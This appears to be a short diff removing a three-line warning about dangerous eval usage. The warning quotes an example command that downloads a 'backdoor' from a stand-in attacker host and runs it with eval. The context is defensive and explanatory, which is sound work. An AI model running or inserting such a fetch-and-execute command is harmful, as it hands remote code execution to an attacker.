@@ -1,3 +1,0 @@
-Dangerous eval usage detected:
-eval $(curl -s evil.com/backdoor)
-This can execute arbitrary code.
